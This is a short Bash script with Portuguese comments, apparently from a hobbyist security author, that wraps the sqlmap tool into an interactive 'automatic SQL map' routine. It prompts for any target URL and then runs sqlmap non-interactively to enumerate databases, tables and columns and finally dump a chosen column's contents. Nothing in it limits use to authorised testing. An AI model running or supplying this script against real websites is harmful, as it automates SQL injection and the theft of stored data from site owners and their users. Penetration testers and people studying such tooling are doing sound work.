#!/bin/bash
######################################
## code by: @Ark-c3                 ##
## https://arkc3ti.blogspot.com.br/ ##
## https://github.com/ark-c3        ##
## arkc37cont@gmail.com             ##
######################################


user=$(whoami)
root=$(id -u)
dirsql=/home/$user/.sqlmap
zero='\033[00;00;00m'







#limpa o terminal
clear

#head
sleep 0.1
echo -e "\033[01;34m##############################"
sleep 0.1
echo -e "##                          ##"
sleep 0.1
echo -e "##  \033[05;31m- SQL MAP AUTOMATICO - $zero \033[01;34m##"
sleep 0.1
echo -e "##                          ##"
sleep 0.1
echo -e "##############################"
sleep 1
echo -e "$zero"

#entrando na pasta do sql
if [ $root = 0 ];then
  cd /root/.sqlmap
else
  cd /home/$user/.sqlmap
fi

echo
echo -e "\033[01;33mINICIANDO..."
echo
sleep 1

#pede a url
echo -e "$zero"
echo -ne "\033[00;34mDIGITE A URL \033[00;31m~# \033[00;32m" ; read url
echo
sleep 0.1
echo -e "$zero"

#lista as databases
sqlmap -u $url --risk 2 --level 2 --batch --dbs


#pede o nome da database
echo -ne "\033[00;34mNOME DA DATABASE \033[00;31m~# \033[00;32m" ; read db
echo
sleep 0.1
echo -e "$zero"

#lista as tabelas
sqlmap -u $url --risk 2 --level 2 --batch -D $db --tables

#pede o nome da tabela
echo -ne "\033[00;34mNOME DA TABELA \033[00;31m~# \033[00;32m" ; read tabela
echo
sleep 0.1
echo -e "$zero"

#lista as coluna
sqlmap -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns

#pede o nome da coluna
echo -ne "\033[00;34mNOME DA COLUNA \033[00;31m~# \033[00;32m" ; read coluna
echo
sleep 0.1
echo -e "$zero"

#resultado
sqlmap -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna --dump

echo
echo
echo -e "\033[07;37mCONCLUIDO!"
sleep 1
echo -e "$zero" ; read -p "enter para sair..."
